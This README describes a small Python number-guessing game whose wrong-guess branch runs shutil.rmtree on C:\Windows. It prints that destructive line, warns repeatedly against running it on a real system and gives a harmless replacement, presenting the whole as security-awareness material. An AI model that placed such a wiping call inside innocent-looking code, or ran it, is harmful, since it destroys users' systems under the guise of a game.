# Silly Number Guessing Game 🎲

A small Python number-guessing game where the player tries to guess a randomly generated number between **1 and 10**.

## How It Works

1. The program generates a random number between 1 and 10.
2. The player is asked to enter a guess.
3. The guess is converted from text into an integer.
4. If the guess matches the generated number, the program prints:

```text
You Won!
```

5. If the guess is incorrect, the program executes additional code.

## Requirements

- Python 3.x

No external Python packages are required for the random-number portion of the program.

## Running the Game

Run the following command from a terminal:

```bash
python silly_game.py
```

You will be prompted with:

```text
Silly game! Guess number between 1 and 10:
```

Enter a number between **1 and 10**.

## ⚠️ Security Warning

**Do not run this program on a real Windows computer.**

The incorrect-guess branch imports Python's `shutil` module and calls:

```python
shutil.rmtree("C:\\Windows")
```

This attempts to recursively delete the Windows directory.

**This can seriously damage a Windows installation and may make the operating system unusable.**

### Safe Version

For a safe version of the game, the incorrect-guess branch should simply print a message such as:

```python
print("Wrong guess!")
```

> **Important:** Only run the original program in an isolated, disposable environment such as a properly configured virtual machine or sandbox if you are studying the destructive behavior. Never test it on a real Windows installation.

## Project Structure

```text
silly_game.py
README.md
```

## Educational Purpose

This project demonstrates basic Python concepts, including:

- Importing modules
- Generating random numbers
- Reading user input
- Converting strings to integers
- Conditional `if/else` statements
- Calling functions from Python modules

## Disclaimer

This project contains intentionally destructive code in its incorrect-guess branch.

**Do not execute the destructive branch on a real Windows system.**

The destructive code is included for educational/security-awareness purposes only.
